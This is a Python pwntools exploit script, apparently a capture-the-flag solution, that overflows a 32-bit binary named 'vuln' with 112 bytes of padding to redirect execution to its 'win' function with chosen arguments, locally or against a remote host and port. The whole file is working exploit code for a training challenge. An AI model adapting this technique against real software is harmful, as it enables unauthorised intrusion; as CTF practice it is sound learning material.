#!/usr/bin/env python3
import argparse, pwn

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices = {"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)
args = parser.parse_args()

elf = pwn.ELF("./vuln")

offset = 112
new_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
    [
        b"A" * 112,
        new_eip,
        return_address,
        pwn.p32(0xCAFEF00D),
        pwn.p32(0XF00DF00D),
    ]
)

payload += b"\n"

with open("payload", "wb") as filp:
	filp.write(payload)

if args.destination == "local":
	p = elf.process()

elif args.destination == "remote":
	if not args.target or not args.port:
		pwn.warning("Supply -t for target and -p for port")
		exit()
		
	p = pwn.remote(args.target, args.port)

p.sendline(payload)
p.interactive()